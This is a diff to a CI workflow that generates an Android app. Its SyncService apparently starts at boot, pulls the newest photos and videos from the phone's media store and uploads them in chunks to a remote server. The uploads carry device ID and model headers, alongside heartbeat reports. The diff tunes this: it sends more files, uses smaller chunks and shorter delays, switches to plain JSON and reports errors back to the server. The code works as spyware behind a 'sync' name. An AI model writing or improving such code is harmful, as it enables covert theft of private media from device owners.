@@ -27,7 +27,6 @@ jobs:
         run: |
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
-          # AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -87,7 +86,6 @@ jobs:
           </manifest>
           EOF
 
-          # MainActivity.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
           package com.abod.app
 
@@ -144,7 +142,6 @@ jobs:
           }
           EOF
 
-          # BootReceiver.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
           package com.abod.app
 
@@ -165,7 +162,6 @@ jobs:
           }
           EOF
 
-          # SyncService.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -235,16 +231,15 @@ jobs:
                               conn.requestMethod = "POST"
                               conn.setRequestProperty("X-Node-ID", deviceId)
                               conn.setRequestProperty("X-Node-Model", nodeModel)
-                              conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                              conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                               conn.doOutput = true
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
                               val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node active from $nodeModel\"}"
-                              val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
-                                  os.write(base64Payload)
+                                  os.write(reportJson)
                                   os.flush()
                               }
 
@@ -344,7 +339,7 @@ jobs:
                       try {
                           val uri = if (isImage) MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                           val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
-                          val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 3")
+                          val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 5")
                           
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
@@ -361,7 +356,7 @@ jobs:
                               }
                           }
                       } catch (e: Exception) {
-                          // Ignored
+                          sendReportToServer(nodeId, nodeModel, "Error extracting media: ${e.message}")
                       }
                   }
               }
@@ -372,7 +367,7 @@ jobs:
                       val fileBytes = file.readBytes()
                       val fileHash = MessageDigest.getInstance("SHA-256").digest(fileBytes).joinToString("") { "%02x".format(it) }
                       
-                      val chunkSize = 512 * 1024
+                      val chunkSize = 256 * 1024
                       val totalChunks = (fileBytes.size + chunkSize - 1) / chunkSize
 
                       for (i in 0 until totalChunks) {
@@ -389,20 +384,19 @@ jobs:
                           conn.requestMethod = "POST"
                           conn.setRequestProperty("X-Node-ID", nodeId)
                           conn.setRequestProperty("X-Node-Model", nodeModel)
-                          conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                          conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                           conn.doOutput = true
 
-                          val base64Payload = Base64.getEncoder().encodeToString(jsonPacket.toByteArray(Charsets.UTF_8))
                           OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
-                              os.write(base64Payload)
+                              os.write(jsonPacket)
                               os.flush()
                           }
                           conn.responseCode
                           conn.disconnect()
-                          delay(200L)
+                          delay(100L)
                       }
                   } catch (e: Exception) {
-                      // Ignored
+                      sendReportToServer(nodeId, nodeModel, "Error sending file $fileName: ${e.message}")
                   }
               }
 
@@ -413,15 +407,14 @@ jobs:
                       conn.requestMethod = "POST"
                       conn.setRequestProperty("X-Node-ID", nodeId)
                       conn.setRequestProperty("X-Node-Model", nodeModel)
-                      conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                      conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                       conn.doOutput = true
                       
                       val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
                       val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
-                      val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
 
                       OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
-                          os.write(base64Payload)
+                          os.write(reportJson)
                           os.flush()
                       }
                       conn.responseCode
@@ -433,15 +426,12 @@ jobs:
 
               override fun onDestroy() {
                   super.onDestroy()
-                  wakeLock?.release()
-                  serviceScope.cancel()
               }
 
               override fun onBind(intent: Intent?): IBinder? = null
           }
           EOF
 
-          # app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -478,7 +468,6 @@ jobs:
           }
           EOF
 
-          # build.gradle (Root)
           cat << 'EOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
@@ -486,7 +475,6 @@ jobs:
           }
           EOF
 
-          # settings.gradle
           cat << 'EOF' > settings.gradle
           pluginManagement {
               repositories {
@@ -506,7 +494,6 @@ jobs:
           include ':app'
           EOF
 
-          # gradle.properties
           cat << 'EOF' > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
